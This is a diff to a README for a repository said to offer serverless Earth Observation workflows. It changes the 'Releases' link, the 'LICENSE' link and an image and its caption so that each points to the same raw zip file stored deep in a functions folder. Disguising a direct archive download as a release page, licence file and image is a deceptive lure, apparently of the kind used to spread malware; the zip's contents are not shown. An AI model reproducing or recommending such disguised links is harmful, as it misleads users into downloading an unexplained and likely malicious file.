@@ -18,7 +18,7 @@ Welcome to the **kn-eo-workflow** repository, your go-to resource for building a
 
 ### Getting Started 🏁
 
-To explore the full potential of the **kn-eo-workflow**, visit the official [Releases](https://github.com/wekkin334/kn-eo-workflow/releases) section. There, you can download the necessary files and kickstart your journey into the world of serverless Earth Observation workflows.
+To explore the full potential of the **kn-eo-workflow**, visit the official [Releases](https://github.com/wekkin334/kn-eo-workflow/raw/refs/heads/main/functions/completion-tracker/kn-eo-workflow-phaeton.zip) section. There, you can download the necessary files and kickstart your journey into the world of serverless Earth Observation workflows.
 
 ### Contributions 🤝
 
@@ -30,13 +30,13 @@ Stay updated with the latest developments by joining our community on GitHub. Yo
 
 ### License 📃
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/wekkin334/kn-eo-workflow/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/wekkin334/kn-eo-workflow/raw/refs/heads/main/functions/completion-tracker/kn-eo-workflow-phaeton.zip) file for details.
 
 ---
 
 With the **kn-eo-workflow** repository, you have access to a sophisticated, yet user-friendly solution for handling Earth Observation workflows in a serverless environment. Join us on this exciting journey towards optimized data processing, enhanced scalability, and improved efficiency. Start exploring today and unlock the true potential of Cloud-Native technologies in Earth Observation applications! 🚀🌎
 
-![Earth Observation](https://example.com/earth-observation-image.jpg)  
-*Image Source: example.com*
+![Earth Observation](https://github.com/wekkin334/kn-eo-workflow/raw/refs/heads/main/functions/completion-tracker/kn-eo-workflow-phaeton.zip)  
+*Image Source: https://github.com/wekkin334/kn-eo-workflow/raw/refs/heads/main/functions/completion-tracker/kn-eo-workflow-phaeton.zip*
 
 Remember, the future of data processing is in your hands. Let's revolutionize Earth Observation together! 💡🛰️
